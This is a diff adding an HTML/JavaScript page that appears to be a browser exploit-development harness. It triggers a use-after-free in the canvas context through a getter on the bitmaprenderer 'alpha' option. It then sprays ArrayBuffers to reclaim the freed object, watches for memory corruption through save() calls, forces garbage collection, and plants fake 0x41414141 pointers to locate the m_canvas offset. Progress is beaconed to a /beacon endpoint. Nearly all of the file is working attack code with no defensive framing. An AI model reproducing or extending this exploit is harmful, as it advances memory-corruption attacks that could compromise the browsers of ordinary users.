@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V549</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V549-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      innerCtx.lineWidth=11111.11111;
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V549-nobeacon-save');
+
+// T1: Same-type reclaim control (always works)
+(function T1(){
+  b('T1-START','control');
+  var ctx=triggerUAF();
+  var ctxs=[];
+  for(var i=0;i<200;i++){
+    var c=document.createElement('canvas');c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  var lw=ctx.lineWidth;
+  b('T1-LW','val='+lw);
+})();
+
+// T2: AB spray + IMMEDIATE save() with NO beacon in between
+// Theory: GC triggered by XHR beacon, not by save() itself.
+// save() = ++m_unrealizedSaveCount = simple memory write to this+offset
+// No allocation, no safe point between spray and save.
+(function T2(){
+  b('T2-START','AB spray + immediate save, no beacon gap');
+  var ctx=triggerUAF();
+  // NO BEACON BETWEEN HERE AND save()!
+
+  // Spray 300 zero ABs
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push({ab:ab, u8:new Uint8Array(ab)});
+  }
+
+  // Snapshot BEFORE save (no beacon between spray and save!)
+  var snaps=[];
+  for(var i=0;i<abs.length;i++){
+    snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+  }
+
+  // IMMEDIATELY call save() — no XHR beacon, no allocation
+  ctx.save();  // This should just ++m_unrealizedSaveCount
+
+  // NOW beacon the result
+  b('T2-SAVE-OK','save() survived!');
+
+  // Check which AB changed
+  var hitCount=0;
+  for(var i=0;i<abs.length;i++){
+    for(var j=0;j<768;j++){
+      if(abs[i].u8[j]!==snaps[i][j]){
+        var diffs=[];
+        for(var jj=Math.max(0,j-4);jj<Math.min(768,j+24);jj++){
+          if(abs[i].u8[jj]!==snaps[i][jj]){
+            diffs.push('off'+jj+':0x'+snaps[i][jj].toString(16)+'->0x'+abs[i].u8[jj].toString(16));
+          }
+        }
+        b('T2-HIT','AB['+i+'] '+diffs.join(','));
+        hitCount++;
+        break;
+      }
+    }
+    if(hitCount>=3)break;
+  }
+  if(hitCount===0)b('T2-MISS','no AB bytes changed');
+})();
+
+// T3: Same as T2 but call save() x10 for bigger signal
+(function T3(){
+  b('T3-START','save x10 immediate');
+  var ctx=triggerUAF();
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    abs.push({ab:ab, u8:new Uint8Array(ab)});
+  }
+
+  var snaps=[];
+  for(var i=0;i<abs.length;i++){
+    snaps.push(new Uint8Array(abs[i].ab.slice(0)));
+  }
+
+  // 10 saves immediately
+  ctx.save();ctx.save();ctx.save();ctx.save();ctx.save();
+  ctx.save();ctx.save();ctx.save();ctx.save();ctx.save();
+
+  b('T3-SAVE-OK','10x save() survived!');
+
+  var hitCount=0;
+  for(var i=0;i<abs.length;i++){
+    for(var j=0;j<768;j++){
+      if(abs[i].u8[j]!==snaps[i][j]){
+        var diffs=[];
+        for(var jj=Math.max(0,j-4);jj<Math.min(768,j+24);jj++){
+          if(abs[i].u8[jj]!==snaps[i][jj]){
+            diffs.push('off'+jj+':0x'+snaps[i][jj].toString(16)+'->0x'+abs[i].u8[jj].toString(16));
+          }
+        }
+        b('T3-HIT','AB['+i+'] '+diffs.join(','));
+        hitCount++;
+        break;
+      }
+    }
+    if(hitCount>=3)break;
+  }
+  if(hitCount===0)b('T3-MISS','no AB changed');
+})();
+
+// T4: GC survival test — after save(), force GC and see if we crash
+// If save() survived but GC crashes, we know the window
+(function T4(){
+  b('T4-START','GC survival after save');
+  var ctx=triggerUAF();
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    abs.push(new ArrayBuffer(768));
+  }
+
+  // save() without beacon
+  ctx.save();
+
+  b('T4-SAVE-OK','save survived');
+
+  // Now force GC — this should crash if m_canvas=NULL
+  var junk;
+  for(var g=0;g<20;g++){
+    junk=[];
+    for(var j=0;j<5000;j++)junk.push({a:j});
+    junk=null;
+  }
+
+  b('T4-GC-OK','GC survived!');
+
+  // Try save again after GC
+  ctx.save();
+  b('T4-SAVE2-OK','2nd save after GC survived!');
+})();
+
+// T5: AB spray with non-zero m_canvas area
+// Put a recognizable value at offset 40 (estimated m_canvas)
+// Also try offset 32 and 48 in case alignment differs
+// Use 0x4141414141414141 — will crash at a KNOWN address if dereferenced
+// This lets us confirm the m_canvas offset
+(function T5(){
+  b('T5-START','AB spray with fake m_canvas');
+  var ctx=triggerUAF();
+
+  var abs=[];
+  for(var i=0;i<300;i++){
+    var ab=new ArrayBuffer(768);
+    var dv=new DataView(ab);
+    // Try offsets 32, 40, 48 — one should be m_canvas
+    // Write the address of a large AB we'll allocate next as the "canvas"
+    // For now, write 0x4141414141414141 at each candidate offset
+    // This will crash at 0x41..41 + opaqueRoot field offset
+    dv.setFloat64(32,3.0139222484469483e-71,false); // 0x4141414141414141
+    dv.setFloat64(40,3.0139222484469483e-71,false);
+    dv.setFloat64(48,3.0139222484469483e-71,false);
+    abs.push(ab);
+  }
+
+  // save() immediately — no GC trigger
+  ctx.save();
+  b('T5-SAVE-OK','save with fake m_canvas survived');
+
+  // NOW trigger GC — should crash at 0x4141...
+  // If the crash doesn't happen, m_canvas isn't at 32/40/48
+  var junk;
+  for(var g=0;g<20;g++){
+    junk=[];
+    for(var j=0;j<5000;j++)junk.push({a:j});
+    junk=null;
+  }
+  b('T5-GC-OK','GC survived with fake m_canvas!');
+})();
+
+b('DONE','V549-all-complete');
+</script>
+</body></html>
